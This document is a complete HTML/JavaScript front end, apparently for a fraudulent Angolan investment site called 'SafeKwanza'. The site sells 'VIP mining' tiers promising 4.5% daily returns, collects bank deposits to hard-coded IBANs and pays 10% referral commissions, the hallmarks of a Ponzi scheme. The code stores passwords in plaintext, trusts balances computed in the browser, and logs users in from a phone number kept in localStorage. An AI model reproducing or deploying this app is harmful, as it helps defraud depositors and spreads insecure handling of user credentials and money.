<!DOCTYPE html>
<html lang="pt-AO">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>SafeKwanza | Investimento</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-database-compat.js"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap');
        body { font-family: 'Inter', sans-serif; background: #fff; color: #000; -webkit-tap-highlight-color: transparent; }
        .page { display: none; min-height: 100vh; }
        .page.active { display: flex; flex-direction: column; }
        .font-black-italic { font-weight: 900; font-style: italic; }
        #drawer { transform: translateX(-100%); transition: 0.4s cubic-bezier(0.4, 0, 0.2, 1); z-index: 3000; }
        #drawer.open { transform: translateX(0); }
        #overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.6); backdrop-filter: blur(4px); z-index: 2500; }
        #toast { visibility: hidden; min-width: 280px; background: #000; color: #fff; text-align: center; border-radius: 20px; padding: 18px; position: fixed; z-index: 5000; left: 50%; top: 25px; transform: translateX(-50%); border: 2px solid #0052FF; font-weight: 800; }
        #toast.show { visibility: visible; animation: slideIn 0.4s forwards, slideOut 0.4s 2.6s forwards; }
        @keyframes slideIn { from { top: -100px; opacity: 0; } to { top: 25px; opacity: 1; } }
        @keyframes slideOut { from { top: 25px; opacity: 1; } to { top: -100px; opacity: 0; } }
    </style>
</head>
<body>

    <div id="toast">Notificação</div>
    <div id="overlay" onclick="toggleMenu()"></div>

    <div id="authPage" class="page active items-center justify-center p-6 bg-slate-50">
        <div class="w-full max-w-sm bg-white p-10 rounded-[45px] shadow-2xl border border-slate-100 text-center">
            <h1 class="text-4xl font-black-italic italic tracking-tighter uppercase mb-2">SAFE<span class="text-[#0052FF]">KWANZA</span></h1>
            <p class="text-[9px] font-black uppercase tracking-[0.4em] text-slate-400 italic mb-10">Angola Digital Assets</p>
            <div class="flex mb-8 bg-slate-100 p-1.5 rounded-2xl">
                <button id="tabL" onclick="switchAuth('login')" class="flex-1 py-3 rounded-xl text-[10px] font-black uppercase transition-all bg-white shadow-sm text-[#0052FF]">Entrar</button>
                <button id="tabR" onclick="switchAuth('reg')" class="flex-1 py-3 rounded-xl text-[10px] font-black uppercase transition-all text-slate-400">Registo</button>
            </div>
            <div class="space-y-4">
                <input type="tel" id="uPhone" placeholder="Terminal (9xxxxxxxx)" class="w-full p-5 bg-slate-50 rounded-2xl border-2 border-transparent focus:border-[#0052FF] outline-none font-bold">
                <input type="password" id="uPass" placeholder="Senha" class="w-full p-5 bg-slate-50 rounded-2xl border-2 border-transparent focus:border-[#0052FF] outline-none font-bold">
                <button onclick="handleAuth()" class="w-full bg-black text-white p-5 rounded-3xl font-black uppercase text-[11px] italic">Aceder Carteira</button>
            </div>
        </div>
    </div>

    <div id="dashPage" class="page">
        <div id="drawer" class="fixed top-0 left-0 h-full w-72 bg-black text-white p-10 flex flex-col">
            <h2 class="text-2xl font-black-italic text-[#0052FF] mb-12 italic tracking-tighter">MENU</h2>
            <nav class="flex-1 space-y-7">
                <button onclick="nav('vips')" class="block font-black text-xs uppercase italic">Mineração VIP</button>
                <button onclick="nav('recharge')" class="block font-black text-xs uppercase italic text-emerald-400">Recarregar</button>
                <button onclick="nav('withdraw')" class="block font-black text-xs uppercase italic text-red-400">Sacar Lucros</button>
                <button onclick="nav('team')" class="block font-black text-xs uppercase italic text-amber-400">Afiliados (10%)</button>
                <button onclick="nav('history')" class="block font-black text-xs uppercase italic text-blue-400">Histórico</button>
            </nav>
            <button onclick="logout()" class="w-full bg-red-600 p-5 rounded-2xl font-black text-[10px] uppercase italic">Sair</button>
        </div>

        <header class="bg-black p-12 pt-16 text-center border-b-[10px] border-[#0052FF] relative">
            <button onclick="toggleMenu()" class="absolute top-8 left-8 text-white bg-white/10 p-3 rounded-xl">
                <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-width="3" d="M4 6h16M4 12h16M4 18h16"></path></svg>
            </button>
            <p class="text-[#0052FF] text-[10px] font-black uppercase tracking-[0.5em] mb-4 italic">Balanço Acumulado</p>
            <h3 class="text-5xl font-black-italic text-white italic tracking-tighter"><span id="balanceDisp">0,00</span> <span class="text-xl text-blue-600">Kz</span></h3>
            <div id="miningBadge" class="hidden mt-8 bg-emerald-500/10 border border-emerald-500/30 px-5 py-2.5 rounded-full inline-flex items-center gap-3">
                <span id="activeVipLabel" class="text-emerald-400 font-black text-[9px] uppercase italic"></span>
            </div>
        </header>

        <main class="p-6 pb-28 max-w-lg mx-auto w-full flex-1">
            <div id="vipsSect" class="space-y-4"><div id="vipGrid" class="space-y-4"></div></div>
            
            <div id="rechargeSect" class="hidden">
                <div class="bg-white border-4 border-black p-8 rounded-[40px] text-center">
                    <h2 class="font-black italic text-2xl mb-6 uppercase">Recarga</h2>
                    <select id="bankChoice" onchange="updateBank()" class="w-full p-5 bg-slate-50 border-2 rounded-2xl font-black text-xs mb-4 outline-none">
                        <option value="">BANCO...</option><option value="BAI">BAI</option><option value="BFA">BFA</option>
                    </select>
                    <div id="bankDetails" class="hidden mb-6 p-6 bg-slate-900 rounded-3xl text-blue-400 text-[11px] font-mono italic text-left">
                        IBAN:<br><span id="ibanVal" class="text-white font-black text-sm block mt-2"></span>
                    </div>
                    <input type="number" id="depAmount" placeholder="Valor (Kz)" class="w-full p-5 border-2 rounded-2xl font-black mb-4 outline-none">
                    <p class="text-[9px] font-black text-slate-400 mb-2 uppercase italic">Anexar Comprovativo (Foto):</p>
                    <input type="file" id="depFile" accept="image/*" class="text-[10px] mb-8 block w-full">
                    <button onclick="handleDeposit()" class="w-full bg-[#0052FF] text-white p-6 rounded-3xl font-black uppercase text-[11px] italic">Confirmar Depósito</button>
                </div>
            </div>

            <div id="withdrawSect" class="hidden">
                <div class="bg-white border-4 border-black p-8 rounded-[40px] text-center">
                    <h2 class="font-black italic text-2xl text-red-600 mb-6 uppercase">Saque</h2>
                    <input type="text" id="wIban" placeholder="IBAN (21 dígitos)" maxlength="25" class="w-full p-5 bg-slate-50 border-2 rounded-2xl font-black mb-4 font-mono text-xs outline-none">
                    <input type="number" id="wAmount" oninput="calcW()" placeholder="Valor (Mín. 1.500 Kz)" class="w-full p-5 bg-slate-50 border-2 rounded-2xl font-black mb-4 outline-none">
                    <div id="feeBox" class="p-5 bg-red-50 rounded-3xl border border-red-100 hidden mb-6 text-[10px] font-black uppercase">
                        <div class="flex justify-between"><span>Taxa (10%):</span><span id="taxVal">0 Kz</span></div>
                        <div class="flex justify-between mt-2 text-[12px]"><span>Receberá:</span><span class="text-emerald-600" id="finalVal">0 Kz</span></div>
                    </div>
                    <button onclick="handleWithdraw()" class="w-full bg-black text-white p-6 rounded-3xl font-black uppercase text-[11px] italic">Sacar Agora</button>
                </div>
            </div>

            <div id="teamSect" class="hidden">
                <div class="bg-black p-10 rounded-[45px] text-white text-center shadow-2xl border-b-8 border-[#0052FF]">
                    <h2 class="text-2xl font-black-italic text-[#0052FF] mb-4 uppercase italic tracking-tighter">CONVITES</h2>
                    <div class="bg-white/10 p-5 rounded-2xl border border-white/20 mb-6">
                        <p id="refLinkText" class="text-[10px] font-black text-blue-400 break-all"></p>
                    </div>
                    <button onclick="copyRefLink()" class="w-full bg-[#0052FF] text-white py-5 rounded-3xl font-black uppercase text-[11px] italic">Copiar Link</button>
                </div>
            </div>

            <div id="historySect" class="hidden space-y-3"><div id="historyList" class="space-y-3"></div></div>
        </main>
    </div>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyC3SurEz7aLcHG4yBUq5zrGBPOb2mvLpZ4",
            authDomain: "fir-6e9ec.firebaseapp.com",
            databaseURL: "https://fir-6e9ec-default-rtdb.firebaseio.com",
            projectId: "fir-6e9ec",
            storageBucket: "fir-6e9ec.firebasestorage.app",
            messagingSenderId: "579697818964",
            appId: "1:579697818964:web:aad151fcbe3989df431cc1"
        };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        const VIP_DATA = [
            { id: 1, name: "VIP 1", price: 5000, income: 225 },
            { id: 2, name: "VIP 2", price: 15000, income: 675 },
            { id: 3, name: "VIP 3", price: 50000, income: 2250 },
            { id: 4, name: "VIP 4", price: 100000, income: 4500 },
            { id: 5, name: "VIP 5", price: 250000, income: 11250 },
            { id: 6, name: "VIP 6", price: 500000, income: 22500 }
        ];

        let user = null;
        let authTab = 'login';

        const savedPhone = localStorage.getItem('sk_logged_phone');
        if(savedPhone) {
            db.ref('users/' + savedPhone).once('value', snap => {
                if(snap.exists()){ user = snap.val(); startApp(); }
            });
        }
        renderVips();

        function handleAuth() {
            const phone = document.getElementById('uPhone').value;
            const pass = document.getElementById('uPass').value;
            if(phone.length < 9) return showMsg("NÚMERO INVÁLIDO");

            db.ref('users/' + phone).once('value', snap => {
                if(authTab === 'reg') {
                    if(snap.exists()) return showMsg("NÚMERO JÁ REGISTADO");
                    user = { phone, pass, balance: 1000, vipPrice: 0, dailyIncome: 0, lastUpdate: Date.now(), isBanned: false, history: { "h0": {type:'Bónus Inicial', val:1000, date:new Date().toLocaleString(), status:'OK'} } };
                    saveCloud(); startApp();
                } else {
                    if(!snap.exists()) return showMsg("CONTA INEXISTENTE");
                    const data = snap.val();
                    if(data.isBanned) return showMsg("CONTA BLOQUEADA");
                    if(data.pass !== pass) return showMsg("SENHA INCORRETA");
                    user = data; startApp();
                }
            });
        }

        function startApp() {
            localStorage.setItem('sk_logged_phone', user.phone);
            document.getElementById('authPage').classList.remove('active');
            document.getElementById('dashPage').classList.add('active');
            
            // LINK DE CONVITE ATUALIZADO PARA GITHUB PAGES
            document.getElementById('refLinkText').innerText = `https://safekwanzakz.github.io/AO2026/index.html?ref=${user.phone}`;
            
            updateUI();
            setInterval(() => {
                if(user.dailyIncome > 0) {
                    const now = Date.now();
                    user.balance += (user.dailyIncome / 86400) * ((now - user.lastUpdate) / 1000);
                    user.lastUpdate = now;
                    document.getElementById('balanceDisp').innerText = user.balance.toLocaleString('pt-AO', {minimumFractionDigits: 2});
                    if(Math.floor(now/1000) % 15 === 0) saveCloud();
                }
            }, 1000);
        }

        function upgradeVip(id) {
            const vip = VIP_DATA.find(v => v.id === id);
            if (user.vipPrice > 0) {
                user.balance += user.vipPrice;
                showMsg(`REEMBOLSO DE ${user.vipPrice.toLocaleString()} Kz APLICADO!`, false);
            }
            if(user.balance < vip.price) {
                if(user.vipPrice > 0) user.balance -= user.vipPrice;
                return showMsg("SALDO INSUFICIENTE PARA ESTE VIP");
            }
            user.balance -= vip.price; 
            user.vipPrice = vip.price; 
            user.dailyIncome = vip.income; 
            user.lastUpdate = Date.now();
            if(!user.history) user.history = {};
            user.history["v"+Date.now()] = {type: `Upgrade ${vip.name}`, val: vip.price, date: new Date().toLocaleString(), status: 'ATIVO'};
            saveCloud(); 
            updateUI(); 
            showMsg(`UPGRADE PARA ${vip.name} CONCLUÍDO!`, false);
        }

        function handleDeposit() {
            const v = parseFloat(document.getElementById('depAmount').value);
            const file = document.getElementById('depFile').files[0];
            if(isNaN(v) || v < 1000 || !file) return showMsg("DADOS EM FALTA");
            const reader = new FileReader();
            reader.onload = function(e) {
                if(!user.history) user.history = {};
                user.history["d"+Date.now()] = { type: 'Depósito', val: v, date: new Date().toLocaleString(), status: 'PENDENTE', proof: e.target.result };
                saveCloud(); showMsg("ENVIADO!", false); nav('history');
            };
            reader.readAsDataURL(file);
        }

        function handleWithdraw() {
            const iban = document.getElementById('wIban').value;
            const v = parseFloat(document.getElementById('wAmount').value);
            if(iban.length < 21 || v < 1500 || v > user.balance) return showMsg("ERRO NOS DADOS");
            user.balance -= v;
            if(!user.history) user.history = {};
            user.history["w"+Date.now()] = { type: 'Saque', val: v*0.9, bruto: v, date: new Date().toLocaleString(), status: 'PROCESSANDO', iban: iban };
            saveCloud(); updateUI(); showMsg("SOLICITADO!", false); nav('history');
        }

        function updateBank() {
            const b = document.getElementById('bankChoice').value;
            document.getElementById('bankDetails').classList.toggle('hidden', !b);
            document.getElementById('ibanVal').innerText = b === 'BFA' ? '000600002870913430151' : '004000000927066710141';
        }

        function saveCloud() { if(user) db.ref('users/' + user.phone).set(user); }
        function logout() { localStorage.removeItem('sk_logged_phone'); location.reload(); }
        function copyRefLink() { navigator.clipboard.writeText(document.getElementById('refLinkText').innerText).then(() => showMsg("COPIADO!", false)); }
        function showMsg(txt, isErr = true) { const t = document.getElementById('toast'); t.innerText = txt; t.style.borderColor = isErr ? '#f00' : '#0052FF'; t.classList.add("show"); setTimeout(() => t.classList.remove("show"), 3000); }
        function switchAuth(tab) { authTab = tab; const isL = tab === 'login'; document.getElementById('tabL').className = isL ? "flex-1 py-3 rounded-xl text-[10px] font-black uppercase bg-white shadow-sm text-[#0052FF]" : "flex-1 py-3 rounded-xl text-[10px] font-black uppercase text-slate-400"; document.getElementById('tabR').className = !isL ? "flex-1 py-3 rounded-xl text-[10px] font-black uppercase bg-white shadow-sm text-[#0052FF]" : "flex-1 py-3 rounded-xl text-[10px] font-black uppercase text-slate-400"; }
        function calcW() { const v = parseFloat(document.getElementById('wAmount').value); const box = document.getElementById('feeBox'); if(v >= 1500) { box.classList.remove('hidden'); document.getElementById('taxVal').innerText = (v*0.1).toLocaleString() + " Kz"; document.getElementById('finalVal').innerText = (v*0.9).toLocaleString() + " Kz"; } else box.classList.add('hidden'); }
        function nav(s) { ['vips','recharge','withdraw','history','team'].forEach(x => { const el = document.getElementById(x+'Sect'); if(el) el.classList.toggle('hidden', x !== s); }); if(s === 'history') updateHistoryUI(); toggleMenu(); }
        function toggleMenu() { document.getElementById('drawer').classList.toggle('open'); document.getElementById('overlay').style.display = document.getElementById('drawer').classList.contains('open') ? 'block' : 'none'; }
        function updateUI() { if(!user) return; document.getElementById('balanceDisp').innerText = user.balance.toLocaleString('pt-AO', {minimumFractionDigits: 2}); const badge = document.getElementById('miningBadge'); badge.classList.toggle('hidden', user.dailyIncome <= 0); if(user.vipPrice > 0) document.getElementById('activeVipLabel').innerText = `VIP ${user.vipPrice.toLocaleString()} ATIVO`; }
        function updateHistoryUI() { const list = user.history ? Object.values(user.history).reverse() : []; document.getElementById('historyList').innerHTML = list.map(h => `<div class="bg-white border p-5 rounded-3xl flex justify-between items-center italic"><div><p class="text-[10px] font-black uppercase">${h.type}</p><p class="text-[8px] font-bold text-slate-400">${h.date}</p></div><div class="text-right"><p class="font-black text-[#0052FF]">${h.val.toLocaleString()} Kz</p><p class="text-[8px] font-black uppercase text-emerald-500">${h.status}</p></div></div>`).join(''); }
        function renderVips() { document.getElementById('vipGrid').innerHTML = VIP_DATA.map(v => `<div class="bg-white p-6 rounded-[35px] border-2 border-slate-50 flex items-center justify-between shadow-md"><div><h4 class="text-[9px] font-black uppercase text-slate-400 italic">${v.name}</h4><p class="text-xl font-black italic">${v.price.toLocaleString()} Kz</p><p class="text-[8px] font-black text-emerald-500 uppercase">+${v.income} Kz/dia</p></div><button onclick="upgradeVip(${v.id})" class="bg-black text-white px-7 py-4 rounded-2xl font-black text-[9px] uppercase italic">Ativar</button></div>`).join(''); }
    </script>
</body>
                        </html>
